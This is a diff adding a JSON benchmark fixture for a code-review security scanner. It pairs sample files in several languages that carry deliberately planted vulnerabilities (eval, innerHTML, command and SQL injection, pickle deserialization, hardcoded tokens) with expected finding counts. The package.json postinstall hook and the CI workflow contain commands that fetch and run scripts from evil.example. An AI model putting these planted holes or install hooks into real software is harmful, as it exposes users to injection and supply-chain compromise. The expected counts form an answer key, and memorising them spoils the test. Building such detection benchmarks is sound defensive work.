@@ -1,0 +1,248 @@
+{
+  "metadata": {
+    "name": "ReviewForge eval gauntlet",
+    "expected_planted_findings": 87,
+    "baseline_detected_hint": 62,
+    "notes": "Counts intentionally exclude documentation/style/testing findings from security metrics."
+  },
+  "cases": [
+    {
+      "name": "existing-multilanguage-security-fixtures",
+      "kind": "security",
+      "files": [
+        "test_fixtures/python/data_importer.py",
+        "test_fixtures/go/user_service.go",
+        "test_fixtures/java/UserController.java",
+        "test_fixtures/ruby/payment_processor.rb",
+        "test_fixtures/rust/config_loader.rs",
+        "test_fixtures/vue/UserProfile.vue",
+        "test_fixtures/v2/ruby/payment_processor_v2.rb",
+        "test_fixtures/v2/rust/lib_processor.rs",
+        "test_fixtures/v2/vue/UserCard.vue"
+      ],
+      "expected": [
+        {"file": "test_fixtures/python/data_importer.py", "category": "hardcoded-secrets", "count": 1},
+        {"file": "test_fixtures/python/data_importer.py", "category": "sql-injection", "count": 1},
+        {"file": "test_fixtures/python/data_importer.py", "category": "path-traversal", "count": 2},
+        {"file": "test_fixtures/python/data_importer.py", "category": "insecure-deserialization", "count": 2},
+        {"file": "test_fixtures/python/data_importer.py", "category": "command-injection", "count": 1},
+        {"file": "test_fixtures/go/user_service.go", "category": "sql-injection", "count": 1},
+        {"file": "test_fixtures/go/user_service.go", "category": "command-injection", "count": 1},
+        {"file": "test_fixtures/go/user_service.go", "category": "hardcoded-secrets", "count": 1},
+        {"file": "test_fixtures/java/UserController.java", "category": "sql-injection", "count": 1},
+        {"file": "test_fixtures/java/UserController.java", "category": "path-traversal", "count": 1},
+        {"file": "test_fixtures/java/UserController.java", "category": "hardcoded-secrets", "count": 1},
+        {"file": "test_fixtures/java/UserController.java", "category": "command-injection", "count": 1},
+        {"file": "test_fixtures/ruby/payment_processor.rb", "category": "hardcoded-secrets", "count": 1},
+        {"file": "test_fixtures/ruby/payment_processor.rb", "category": "code-injection", "count": 1},
+        {"file": "test_fixtures/ruby/payment_processor.rb", "category": "command-injection", "count": 2},
+        {"file": "test_fixtures/ruby/payment_processor.rb", "category": "insecure-deserialization", "count": 1},
+        {"file": "test_fixtures/rust/config_loader.rs", "category": "command-injection", "count": 1},
+        {"file": "test_fixtures/rust/config_loader.rs", "category": "path-traversal", "count": 1},
+        {"file": "test_fixtures/rust/config_loader.rs", "category": "unsafe-usage", "count": 2},
+        {"file": "test_fixtures/rust/config_loader.rs", "category": "unsafe-block", "count": 1},
+        {"file": "test_fixtures/rust/config_loader.rs", "category": "hardcoded-secrets", "count": 1},
+        {"file": "test_fixtures/vue/UserProfile.vue", "category": "xss", "count": 1},
+        {"file": "test_fixtures/v2/ruby/payment_processor_v2.rb", "category": "hardcoded-secrets", "count": 1},
+        {"file": "test_fixtures/v2/ruby/payment_processor_v2.rb", "category": "code-injection", "count": 2},
+        {"file": "test_fixtures/v2/ruby/payment_processor_v2.rb", "category": "command-injection", "count": 3},
+        {"file": "test_fixtures/v2/ruby/payment_processor_v2.rb", "category": "insecure-deserialization", "count": 2},
+        {"file": "test_fixtures/v2/rust/lib_processor.rs", "category": "hardcoded-secrets", "count": 1},
+        {"file": "test_fixtures/v2/rust/lib_processor.rs", "category": "command-injection", "count": 1},
+        {"file": "test_fixtures/v2/rust/lib_processor.rs", "category": "unsafe-usage", "count": 3},
+        {"file": "test_fixtures/v2/rust/lib_processor.rs", "category": "unsafe-transmute", "count": 1},
+        {"file": "test_fixtures/v2/rust/lib_processor.rs", "category": "path-traversal", "count": 1},
+        {"file": "test_fixtures/v2/vue/UserCard.vue", "category": "hardcoded-secrets", "count": 1},
+        {"file": "test_fixtures/v2/vue/UserCard.vue", "category": "xss", "count": 1},
+        {"file": "test_fixtures/v2/vue/UserCard.vue", "category": "xss-bypass", "count": 1},
+        {"file": "test_fixtures/v2/vue/UserCard.vue", "category": "open-redirect", "count": 1}
+      ]
+    },
+    {
+      "name": "inline-frontend-security-fixtures",
+      "kind": "security",
+      "inline_files": {
+        "gauntlet/frontend/unsafe.js": "const child_process = require('child_process')\nconst secret = 'frontend-secret-12345'\nfunction render(userHtml, cmd, id, token) {\n  eval(userHtml)\n  Function(userHtml)()\n  setTimeout('alert(1)', 10)\n  document.body.innerHTML = userHtml\n  document.write(userHtml)\n  child_process.exec(cmd)\n  db.query(`SELECT * FROM users WHERE id = ${id}`)\n  localStorage.setItem('token', token)\n}\n",
+        "gauntlet/frontend/unsafe.ts": "import { DomSanitizer } from '@angular/platform-browser'\nconst child_process = require('child_process')\nconst apiToken = 'ts-token-12345'\nfunction bind(el: HTMLElement, html: string, sanitizer: DomSanitizer, cmd: string, token: string) {\n  eval(html)\n  el.innerHTML = html\n  const tmpl = '<div [innerHTML]=\"html\"></div>'\n  sanitizer.bypassSecurityTrustHtml(html)\n  child_process.execSync(cmd)\n  sessionStorage.setItem('token', token)\n  return tmpl\n}\n",
+        "gauntlet/frontend/Unsafe.svelte": "<script>\n  export let html\n  const token = 'svelte-token-12345'\n  console.log(document.cookie)\n</script>\n<div>{@html html}</div>\n"
+      },
+      "expected": [
+        {"file": "gauntlet/frontend/unsafe.js", "category": "hardcoded-secrets", "count": 1},
+        {"file": "gauntlet/frontend/unsafe.js", "category": "code-injection", "count": 3},
+        {"file": "gauntlet/frontend/unsafe.js", "category": "xss", "count": 2},
+        {"file": "gauntlet/frontend/unsafe.js", "category": "command-injection", "count": 1},
+        {"file": "gauntlet/frontend/unsafe.js", "category": "sql-injection", "count": 1},
+        {"file": "gauntlet/frontend/unsafe.js", "category": "data-leak", "count": 1},
+        {"file": "gauntlet/frontend/unsafe.ts", "category": "hardcoded-secrets", "count": 1},
+        {"file": "gauntlet/frontend/unsafe.ts", "category": "code-injection", "count": 1},
+        {"file": "gauntlet/frontend/unsafe.ts", "category": "xss", "count": 2},
+        {"file": "gauntlet/frontend/unsafe.ts", "category": "xss-bypass", "count": 1},
+        {"file": "gauntlet/frontend/unsafe.ts", "category": "command-injection", "count": 1},
+        {"file": "gauntlet/frontend/unsafe.ts", "category": "data-leak", "count": 1},
+        {"file": "gauntlet/frontend/Unsafe.svelte", "category": "hardcoded-secrets", "count": 1},
+        {"file": "gauntlet/frontend/Unsafe.svelte", "category": "data-leak", "count": 1},
+        {"file": "gauntlet/frontend/Unsafe.svelte", "category": "xss", "count": 1}
+      ]
+    },
+    {
+      "name": "inline-dependency-and-ci-fixtures",
+      "kind": "dependency",
+      "inline_files": {
+        "gauntlet/package.json": "{\n  \"scripts\": {\"postinstall\": \"curl https://evil.example/install.sh | bash\"},\n  \"dependencies\": {\n    \"left-pad\": \"^1.3.0\",\n    \"debug\": \"latest\"\n  }\n}\n",
+        "gauntlet/requirements.txt": "flask>=2.0\nrequests!=2.31.0\nunsafe-lib==*\n",
+        "gauntlet/pom.xml": "<project>\n  <dependencies>\n    <dependency><version>LATEST</version><scope>system</scope></dependency>\n    <dependency><version>1.0-SNAPSHOT</version></dependency>\n  </dependencies>\n</project>\n",
+        "gauntlet/Gemfile": "source 'https://rubygems.org'\ngem 'private-lib', git: 'https://example.com/private.git'\ngem 'local-lib', path: '../local-lib'\n",
+        "gauntlet/go.mod": "module example.com/app\nrequire (\n  github.com/acme/lib v1.2.3-beta\n)\nreplace github.com/acme/lib => ../lib\n",
+        "gauntlet/Cargo.toml": "[dependencies]\nserde = \"*\"\nprivate = { git = \"https://example.com/private.git\" }\nlocal = { path = \"../local\" }\n",
+        ".github/workflows/build.yml": "name: build\non: [push]\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@main\n      - uses: actions/setup-node@v4\n      - run: curl https://evil.example/install.sh | bash\n      - run: apt-get install imagemagick\n      - run: wget https://evil.example/x | sh\n"
+      },
+      "expected": [
+        {"file": "gauntlet/package.json", "category": "dependency-version-range", "count": 2},
+        {"file": "gauntlet/package.json", "category": "supply-chain-risk", "count": 1},
+        {"file": "gauntlet/requirements.txt", "category": "dependency-version-range", "count": 3},
+        {"file": "gauntlet/pom.xml", "category": "dependency-version-range", "count": 2},
+        {"file": "gauntlet/pom.xml", "category": "dependency-deprecated", "count": 1},
+        {"file": "gauntlet/Gemfile", "category": "supply-chain-risk", "count": 3},
+        {"file": "gauntlet/go.mod", "category": "dependency-version-range", "count": 2},
+        {"file": "gauntlet/go.mod", "category": "supply-chain-risk", "count": 1},
+        {"file": "gauntlet/Cargo.toml", "category": "dependency-version-range", "count": 1},
+        {"file": "gauntlet/Cargo.toml", "category": "supply-chain-risk", "count": 2},
+        {"file": ".github/workflows/build.yml", "category": "ci-security", "count": 1},
+        {"file": ".github/workflows/build.yml", "category": "supply-chain-risk", "count": 3},
+        {"file": ".github/workflows/build.yml", "category": "dependency-version-range", "count": 1}
+      ]
+    }
+  ],
+  "cross_pr_cases": [
+    {
+      "name": "python-code-injection-call",
+      "seed": {
+        "file": "gauntlet/py/sinks.py",
+        "content": "def risky_eval(expr):\n    return eval(expr)\n",
+        "findings": [{"category": "code-injection", "line": 2}]
+      },
+      "consumer": {
+        "file": "gauntlet/py/routes.py",
+        "content": "from gauntlet.py.sinks import risky_eval\ndef route(expr):\n    return risky_eval(expr)\n"
+      },
+      "expected": [{"file": "gauntlet/py/routes.py", "category": "cross-pr-code-injection", "count": 1}]
+    },
+    {
+      "name": "python-deserialization-call",
+      "seed": {
+        "file": "gauntlet/py/cache.py",
+        "content": "import pickle\ndef load_cache(blob):\n    return pickle.loads(blob)\n",
+        "findings": [{"category": "insecure-deserialization", "line": 3}]
+      },
+      "consumer": {
+        "file": "gauntlet/py/session.py",
+        "content": "from gauntlet.py.cache import load_cache\ndef load_session(cookie):\n    return load_cache(cookie)\n"
+      },
+      "expected": [{"file": "gauntlet/py/session.py", "category": "cross-pr-insecure-deserialization", "count": 1}]
+    },
+    {
+      "name": "python-secret-symbol-call",
+      "seed": {
+        "file": "gauntlet/py/secrets.py",
+        "content": "def get_token():\n    return 'ghp_crossprsecret1234567890'\n",
+        "findings": [{"category": "hardcoded-secrets", "line": 2}]
+      },
+      "consumer": {
+        "file": "gauntlet/py/client.py",
+        "content": "from gauntlet.py.secrets import get_token\ndef call_api():\n    return get_token()\n"
+      },
+      "expected": [{"file": "gauntlet/py/client.py", "category": "cross-pr-hardcoded-secrets", "count": 1}]
+    },
+    {
+      "name": "javascript-xss-call",
+      "seed": {
+        "file": "gauntlet/js/sinks.js",
+        "content": "export function dangerousHtml(html) {\n  document.body.innerHTML = html\n}\n",
+        "findings": [{"category": "xss", "line": 2}]
+      },
+      "consumer": {
+        "file": "gauntlet/js/profile.js",
+        "content": "import { dangerousHtml } from 'gauntlet/js/sinks'\nexport function render(bio) {\n  return dangerousHtml(bio)\n}\n"
+      },
+      "expected": [{"file": "gauntlet/js/profile.js", "category": "cross-pr-xss", "count": 1}]
+    },
+    {
+      "name": "go-command-call",
+      "seed": {
+        "file": "gauntlet/go/sink.go",
+        "content": "package sink\nfunc RunCommand(cmd string) error {\n  return exec.Command(cmd).Run()\n}\n",
+        "findings": [{"category": "command-injection", "line": 3}]
+      },
+      "consumer": {
+        "file": "gauntlet/go/handler.go",
+        "content": "package handler\nfunc Handle(cmd string) error {\n  return RunCommand(cmd)\n}\n"
+      },
+      "expected": [{"file": "gauntlet/go/handler.go", "category": "cross-pr-command-injection", "count": 1}]
+    },
+    {
+      "name": "java-command-call",
+      "seed": {
+        "file": "gauntlet/java/Sink.java",
+        "content": "class Sink {\n  void dangerousExec(String cmd) throws Exception {\n    Runtime.getRuntime().exec(cmd);\n  }\n}\n",
+        "findings": [{"category": "command-injection", "line": 3}]
+      },
+      "consumer": {
+        "file": "gauntlet/java/Controller.java",
+        "content": "class Controller {\n  void route(String cmd) throws Exception {\n    dangerousExec(cmd);\n  }\n}\n"
+      },
+      "expected": [{"file": "gauntlet/java/Controller.java", "category": "cross-pr-command-injection", "count": 1}]
+    },
+    {
+      "name": "ruby-code-injection-call",
+      "seed": {
+        "file": "gauntlet/ruby/sink.rb",
+        "content": "def dangerous_eval(code)\n  eval(code)\nend\n",
+        "findings": [{"category": "code-injection", "line": 2}]
+      },
+      "consumer": {
+        "file": "gauntlet/ruby/controller.rb",
+        "content": "def route(params)\n  dangerous_eval(params[:code])\nend\n"
+      },
+      "expected": [{"file": "gauntlet/ruby/controller.rb", "category": "cross-pr-code-injection", "count": 1}]
+    },
+    {
+      "name": "rust-transmute-call",
+      "seed": {
+        "file": "gauntlet/rust/sink.rs",
+        "content": "pub fn parse_header(data: [u8; 4]) -> u32 {\n  unsafe { std::mem::transmute::<[u8; 4], u32>(data) }\n}\n",
+        "findings": [{"category": "unsafe-transmute", "line": 2}]
+      },
+      "consumer": {
+        "file": "gauntlet/rust/route.rs",
+        "content": "use gauntlet::rust::sink::parse_header;\npub fn route(data: [u8; 4]) -> u32 { parse_header(data) }\n"
+      },
+      "expected": [{"file": "gauntlet/rust/route.rs", "category": "cross-pr-unsafe-transmute", "count": 1}]
+    },
+    {
+      "name": "vue-xss-call",
+      "seed": {
+        "file": "gauntlet/vue/sinks.vue",
+        "content": "<script setup lang=\"ts\">\nexport function dangerousHtml(html: string) { return html }\n</script>\n<template><div v-html=\"dangerousHtml(bio)\"></div></template>\n",
+        "findings": [{"category": "xss", "line": 4}]
+      },
+      "consumer": {
+        "file": "gauntlet/vue/Profile.vue",
+        "content": "<script setup lang=\"ts\">\nimport { dangerousHtml } from 'gauntlet/vue/sinks'\nconst rendered = dangerousHtml(user.bio)\n</script>\n"
+      },
+      "expected": [{"file": "gauntlet/vue/Profile.vue", "category": "cross-pr-xss", "count": 1}]
+    },
+    {
+      "name": "svelte-xss-call",
+      "seed": {
+        "file": "gauntlet/svelte/sinks.svelte",
+        "content": "<script>\nexport function dangerousHtml(html) { return html }\n</script>\n<div>{@html dangerousHtml(bio)}</div>\n",
+        "findings": [{"category": "xss", "line": 4}]
+      },
+      "consumer": {
+        "file": "gauntlet/svelte/Profile.svelte",
+        "content": "<script>\nimport { dangerousHtml } from 'gauntlet/svelte/sinks'\nconst rendered = dangerousHtml(bio)\n</script>\n"
+      },
+      "expected": [{"file": "gauntlet/svelte/Profile.svelte", "category": "cross-pr-xss", "count": 1}]
+    }
+  ]
+}
